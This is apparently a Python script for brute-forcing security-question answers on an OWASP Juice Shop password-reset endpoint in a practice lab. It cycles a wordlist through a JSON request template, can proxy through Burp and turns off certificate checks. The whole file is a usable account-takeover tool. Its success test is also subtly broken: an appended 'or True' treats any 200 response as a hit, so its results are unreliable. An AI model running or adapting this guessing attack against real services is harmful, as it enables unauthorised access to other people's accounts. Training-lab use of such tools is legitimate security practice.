#!/usr/bin/env python3
import argparse, time, json, requests
from typing import List

def parse_args():
    p = argparse.ArgumentParser(description="Juice Shop KBA (security question) probe (lab-only).")
    p.add_argument("--base", required=True, help="e.g., http://127.0.0.1:3000")
    p.add_argument("--endpoint", required=True, help="e.g., /rest/PUT_YOUR_ENDPOINT_HERE (from Burp)")
    p.add_argument("--method", default="POST", choices=["POST","PUT"])
    p.add_argument("--template", required=True, help="JSON template with {ANSWER} (and optional {EMAIL})")
    p.add_argument("--answers", required=True, help="One answer per line")
    p.add_argument("--email", default="", help="Value for {EMAIL} in the template")
    p.add_argument("--burp", default=None, help="Proxy like http://127.0.0.1:8080")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--delay", type=float, default=0.0)
    p.add_argument("--max", type=int, default=0)
    p.add_argument("--success-text", default="reset,token,success,new password",
                   help="Comma-separated keywords that indicate success")
    return p.parse_args()

def proxies(burp):
    return {"http": burp, "https": burp} if burp else {}

def prepare_body(raw: str, email: str, answer: str) -> dict:
    s = raw.replace("{EMAIL}", email).replace("{ANSWER}", answer)
    return json.loads(s)

def looks_success(status: int, body: str, needles: List[str]) -> bool:
    if status != 200: 
        return False
    body = body.lower()
    return any(n.strip().lower() in body for n in needles) or True  # 200 alone often means success

def main():
    args = parse_args()
    args = parse_args()
    with open(args.template, "r", encoding="utf-8") as f:
        raw_tpl = f.read()
    words = [w.strip() for w in open(args.answers, "r", encoding="utf-8", errors="ignore") if w.strip()]
    needles = [x.strip() for x in args.success_text.split(",") if x.strip()]

    s = requests.Session()
    s.verify = False   # lab only
    s.proxies = proxies(args.burp)
    s.headers.update({"Content-Type":"application/json","Accept":"application/json","User-Agent":"KBAProbe-JS/1.0 (+lab)"})
    url = args.base.rstrip("/") + args.endpoint

    count = 0
    for ans in words:
        count += 1
        if args.max and count > args.max:
            break
        try:
            body = prepare_body(raw_tpl, args.email, ans)
            r = s.post(url, json=body, timeout=args.timeout) if args.method=="POST" else s.put(url, json=body, timeout=args.timeout)
            ok = looks_success(r.status_code, r.text, needles)
            print(f"{ans:20} -> {r.status_code} ({len(r.content)} bytes){'   <-- HIT' if ok else ''}")
            if ok:
                print("\n[+] SUCCESS with answer:", ans)
                print("[i] Response (first 200 chars):", r.text[:200].replace("\n"," "))
                return 0
        except json.JSONDecodeError as e:
            print(f"{ans:20} -> TEMPLATE ERROR: JSON invalid after substitution: {e}")
            return 2
        except requests.RequestException as e:
            print(f"{ans:20} -> ERROR: {e}")
        if args.delay:
            time.sleep(args.delay)
    print("\n[-] No success with provided answers.")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
